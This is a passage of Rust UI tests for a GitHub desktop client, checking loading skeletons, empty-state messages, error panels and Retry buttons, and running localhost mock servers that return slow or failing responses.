            assert!(!has_text(&rt, "No open issues"));

            rt.update(|s, _| s.page = Page::Actions);
            rt.frame(1.0);
            assert!(rt.find("skeleton-list").is_some(), "Actions shows skeleton rows in {status:?}");
            assert!(!has_text(&rt, "No recent runs"));
            assert!(!contains_text(&rt, "0 of 0 recent runs"));
        }

        // Once the load finishes with genuinely empty results, the real "No …" messages return.
        rt.update(|s, _| {
            s.status = Status::Ready;
            s.page = Page::Overview;
        });
        rt.frame(1.0);
        assert!(rt.find("skeleton-activity").is_none());
        assert_eq!(label_of(&rt, "metric-Repositories").as_deref(), Some("0 Repositories"));
        assert!(has_text(&rt, "0 commits"));
        assert!(has_text(&rt, "No repositories to show"));
        assert!(has_text(&rt, "No open pull requests"));

        rt.update(|s, _| s.page = Page::Repos);
        rt.frame(1.0);
        assert!(rt.find("skeleton-repos").is_none());
        assert!(has_text(&rt, "No repositories to show"));

        rt.update(|s, _| {
            s.data.repos.push(sample_repo("alice/app"));
            s.search = TextEdit::new("zzzz-no-match");
        });
        rt.frame(1.0);
        assert!(has_text(&rt, "No repositories match your search"));

        rt.update(|s, _| {
            s.data = Data::default();
            s.page = Page::Pulls;
        });
        rt.frame(1.0);
        assert!(has_text(&rt, "No pull requests in this state"));

        rt.update(|s, _| s.page = Page::Issues);
        rt.frame(1.0);
        assert!(has_text(&rt, "No open issues"));

        rt.update(|s, _| s.page = Page::Actions);
        rt.frame(1.0);
        assert!(has_text(&rt, "No recent runs"));
    }

    #[test]
    fn failed_first_load_shows_error_and_retry_once_and_retries() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _iso = IsolatedEnv::new("failed");

        let mut rt = new_rt(live_app());
        let err = "Could not reach GitHub (offline).";

        for (page, retry_key, forbidden_empty) in [
            (Page::Overview, "retry-overview", "No repositories to show"),
            (Page::Repos, "retry-repos", "No repositories to show"),
            (Page::Pulls, "retry-pulls", "No pull requests in this state"),
            (Page::Issues, "retry-issues", "No open issues"),
            (Page::Actions, "retry-actions", "No recent runs"),
        ] {
            rt.update(|s, _| {
                s.status = Status::Failed(err.into());
                s.page = page.clone();
            });
            rt.frame(1.0);
            let panel_key = format!("{retry_key}-panel");
            assert!(rt.find(&panel_key).is_some(), "{page:?} shows error panel in place of list");
            assert!(rt.find(retry_key).is_some(), "{page:?} shows Retry button in list area");
            assert!(rt.find("banner").is_none(), "{page:?} omits duplicate top banner when list shows error");
            assert_eq!(count_text(&rt, err), 1, "{page:?} shows the error message exactly once");
            assert_eq!(count_text(&rt, "Retry"), 1, "{page:?} shows Retry exactly once");
            assert!(!has_text(&rt, forbidden_empty), "{page:?} must not claim `{forbidden_empty}` on failed load");
            if page == Page::Overview {
                assert_eq!(label_of(&rt, "metric-Repositories").as_deref(), Some("Repositories, not loaded"));
                assert!(has_text(&rt, "—"), "Overview shows dash instead of 0 when load failed");
            }

            // Clicking Retry starts a fresh load and swaps the error panel for skeletons.
            click(&mut rt, retry_key);
            assert_eq!(rt.state.status, Status::Loading, "{page:?} Retry must start loading");
            assert!(rt.find(&panel_key).is_none());
        }

        // When data is already on screen, the banner remains the single place showing the error and Retry.
        rt.update(|s, _| {
            s.data.repos.push(sample_repo("alice/app"));
            s.status = Status::Failed(err.into());
            s.page = Page::Repos;
        });
        rt.frame(1.0);
        assert!(rt.find("banner").is_some(), "banner is kept when data is on screen");
        assert!(rt.find("retry").is_some());
        assert!(rt.find("retry-repos-panel").is_none());
        assert_eq!(count_text(&rt, err), 1);
        assert_eq!(count_text(&rt, "Retry"), 1);

        // Settings has no empty-list error panel, so the top banner still carries Retry there.
        rt.update(|s, _| {
            s.data = Data::default();
            s.status = Status::Failed(err.into());
            s.page = Page::Settings;
        });
        rt.frame(1.0);
        assert!(rt.find("banner").is_some(), "Settings keeps top banner on failed first load");
        assert!(rt.find("retry").is_some());
    }

    #[test]
    fn code_tab_and_local_clone_show_skeletons_while_loading_and_retry_on_error() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _iso = IsolatedEnv::new("code-tab");

        let mut s = live_app();
        s.status = Status::Ready;
        s.data.repos.push(sample_repo("alice/app"));
        s.page = Page::Repo("alice/app".into());
        s.tab = RepoTab::Code;

        let mut rt = new_rt(s);
        rt.frame(1.0);

        // With no load started (`None`), show static prompts rather than an endless skeleton.
        assert!(rt.find("skeleton-files").is_none());
        assert!(rt.find("skeleton-readme").is_none());
        assert!(rt.find("skeleton-languages").is_none());
        assert!(has_text(&rt, "Open the repository to load its files"));
        assert!(has_text(&rt, "Open the repository to load its README"));
        assert!(!has_text(&rt, "This repository has no README."));

        // Once loading starts (`Some(Load::Loading)`), show skeletons for files, README, and languages.
        rt.update(|s, _| {
            s.details.insert(("alice/app".into(), "main".into()), Load::Loading);
        });
        rt.frame(1.0);
        assert!(rt.find("skeleton-files").is_some());
        assert!(rt.find("skeleton-readme").is_some());
        assert!(rt.find("skeleton-languages").is_some());
        assert!(!has_text(&rt, "Open the repository to load its files"));
        assert!(!has_text(&rt, "Open the repository to load its README"));
        assert!(!has_text(&rt, "Loading files…"));
        assert!(!has_text(&rt, "This repository has no README."));

        // Ready with an empty branch and no README -> real empty messages appear.
        rt.update(|s, _| {
            s.details.insert(("alice/app".into(), "main".into()), Load::Ready(Detail::default()));
        });
        rt.frame(1.0);
        assert!(rt.find("skeleton-files").is_none());
        assert!(rt.find("skeleton-readme").is_none());
        assert!(has_text(&rt, "No files in this branch"));
        assert!(has_text(&rt, "This repository has no README."));

        // Local clone file listing and viewer states.
        rt.update(|s, _| {
            s.files_from_github = false;
            s.local.insert("alice/app".into(), Load::Loading);
        });
        rt.frame(1.0);
        assert!(rt.find("skeleton-local-files").is_some());
        assert!(!has_text(&rt, "Reading the local clone…"));

        rt.update(|s, _| {
            s.local.insert("alice/app".into(), Load::Failed("Clone folder is unreadable.".into()));
        });
        rt.frame(1.0);
        assert!(has_text(&rt, "Clone folder is unreadable."));
        assert!(rt.find("retry-local-files").is_some());

        rt.update(|s, _| {
            s.local.insert("alice/app".into(), Load::Ready(local::Tree {
                branch: "main".into(),
                files: vec!["src/main.rs".into()],
                ..local::Tree::default()
            }));
            s.local_file = Some(("src/main.rs".into(), Load::Loading));
        });
        rt.frame(1.0);
        assert!(rt.find("skeleton-local-file").is_some());
        assert!(!has_text(&rt, "Reading…"));

        rt.update(|s, _| {
            s.local_file = Some(("src/main.rs".into(), Load::Failed("Permission denied.".into())));
        });
        rt.frame(1.0);
        assert!(has_text(&rt, "Permission denied."));
        assert!(rt.find("retry-local-file").is_some());
    }

    #[test]
    fn changes_tab_and_pull_diff_show_skeletons_while_git_runs_and_retry_on_error() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _iso = IsolatedEnv::new("changes-tab");

        let mut s = live_app();
        s.status = Status::Ready;
        s.data.repos.push(sample_repo("alice/app"));
        s.page = Page::Repo("alice/app".into());
        s.tab = RepoTab::Changes;
        s.diff_load = Some(Load::Loading);

        let mut rt = new_rt(s);
        rt.frame(1.0);

        // Initial git status/diff loading -> skeleton diff, no "Reading the changes…" or "0 files".
        assert!(rt.find("skeleton-diff").is_some());
        assert!(!has_text(&rt, "Reading the changes…"));
        assert!(!has_text(&rt, "Nothing changed since the last commit."));
        assert!(!has_text(&rt, "0 files"));

        // While a background git command runs on an otherwise clean diff, show skeleton rather than "Nothing changed".
        rt.update(|s, _| {
            s.diff_load = Some(Load::Ready(()));
            s.git_job = Some("Pulling…");
        });
        rt.frame(1.0);
        assert!(rt.find("skeleton-diff").is_some());
        assert!(!has_text(&rt, "Nothing changed since the last commit."));

        // Once git finishes with no changed files -> real empty message.
        rt.update(|s, _| s.git_job = None);
        rt.frame(1.0);
        assert!(rt.find("skeleton-diff").is_none());
        assert!(has_text(&rt, "Nothing changed since the last commit."));

        // Failed git diff -> error + Retry button.
        rt.update(|s, _| s.diff_load = Some(Load::Failed("git diff failed.".into())));
        rt.frame(1.0);
        assert!(has_text(&rt, "git diff failed."));
        assert!(rt.find("retry-changes").is_some());

        // Pull request diff panel loading and failed states.
        rt.update(|s, _| {
            s.page = Page::Pulls;
            s.pull_diff_of = Some(("alice/app".into(), 12));
            s.pull_diff_load = Some(Load::Loading);
        });
        rt.frame(1.0);
        assert!(rt.find("skeleton-pull-diff").is_some());
        assert!(!has_text(&rt, "Reading the changes…"));
        assert!(!has_text(&rt, "0 files"));

        rt.update(|s, _| s.pull_diff_load = Some(Load::Failed("Could not load pull request files.".into())));
        rt.frame(1.0);
        assert!(has_text(&rt, "Could not load pull request files."));
        assert!(rt.find("retry-pull-diff").is_some());
    }

    #[test]
    fn slow_mock_server_at_200ms_shows_skeletons_and_failed_load_shows_error_in_list() {
        use std::io::{Read, Write};
        use std::net::TcpListener;
        use std::sync::atomic::{AtomicBool, Ordering};

        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _iso = IsolatedEnv::new("slow-mock");

        // 1. Slow mock server (holds request for 450 ms): at 0.2 s after start, skeletons are shown.
        let slow_listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let slow_port = slow_listener.local_addr().unwrap().port();
        slow_listener.set_nonblocking(true).unwrap();
        let running = Arc::new(AtomicBool::new(true));
        let r2 = running.clone();
        let slow_srv = std::thread::spawn(move || {
            while r2.load(Ordering::Relaxed) {
                if let Ok((mut stream, _)) = slow_listener.accept() {
                    let mut buf = [0u8; 1024];
                    let _ = stream.read(&mut buf);
                    for _ in 0..45 {
                        if !r2.load(Ordering::Relaxed) {
                            break;
                        }
                        std::thread::sleep(std::time::Duration::from_millis(10));
                    }
                    let body = "[]";
                    let resp = format!("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len());
                    let _ = stream.write_all(resp.as_bytes());
                } else {
                    std::thread::sleep(std::time::Duration::from_millis(5));
                }
            }
        });

        let mut s = live_app();
        let mut cfg = (*s.cfg).clone();
        cfg.api = format!("http://127.0.0.1:{slow_port}");
        s.cfg = Arc::new(cfg);
        s.page = Page::Repos;
        s.refresh();
        let cfg_bg = s.cfg.clone();
        let (tx, rx) = std::sync::mpsc::channel();
        let load_thread = std::thread::spawn(move || {
            let _ = tx.send(pollster::block_on(github::load_all(&cfg_bg)));
        });

        let mut rt = new_rt(s);
        for _ in 0..12 {
            std::thread::sleep(std::time::Duration::from_millis(17));
            if let Ok(res) = rx.try_recv() {
                let epoch = rt.state.load_gen;
                rt.update(move |app, _| app.apply(epoch, res));
            }
            rt.frame(1.0 / 60.0);
        }
        assert_eq!(rt.state.status, Status::Loading, "still loading at ~0.2 s against slow server");
        assert!(rt.find("skeleton-repos").is_some(), "skeletons shown at 0.2 s on Repos");
        assert!(!has_text(&rt, "No repositories to show"));

        running.store(false, Ordering::Relaxed);
        let _ = slow_srv.join();
        let _ = load_thread.join();

        // 2. Failing mock server (503): failed load shows the error and Retry once in the list.
        let fail_listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let fail_port = fail_listener.local_addr().unwrap().port();
        let fail_srv = std::thread::spawn(move || {
            if let Ok((mut stream, _)) = fail_listener.accept() {
                let mut buf = [0u8; 1024];
                let _ = stream.read(&mut buf);
                let body = r#"{"message":"Service offline."}"#;
                let resp = format!("HTTP/1.1 503 Service Unavailable\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len());
                let _ = stream.write_all(resp.as_bytes());
            }
        });

        let mut fail_cfg = (*rt.state.cfg).clone();
        fail_cfg.api = format!("http://127.0.0.1:{fail_port}");
        let fail_res = pollster::block_on(github::load_all(&fail_cfg));
        let _ = fail_srv.join();
        assert!(fail_res.is_err());

        let epoch = rt.state.load_gen;
        rt.update(move |app, _| app.apply(epoch, fail_res));
        rt.frame(1.0);
        assert!(rt.find("retry-repos-panel").is_some(), "error panel shown in list after failed load");
        assert!(rt.find("retry-repos").is_some(), "Retry button shown in list after failed load");
        assert!(rt.find("banner").is_none());
        assert_eq!(count_text(&rt, "Retry"), 1);
        assert!(contains_text(&rt, "Service offline."));
        assert!(!has_text(&rt, "No repositories to show"));
    }
}


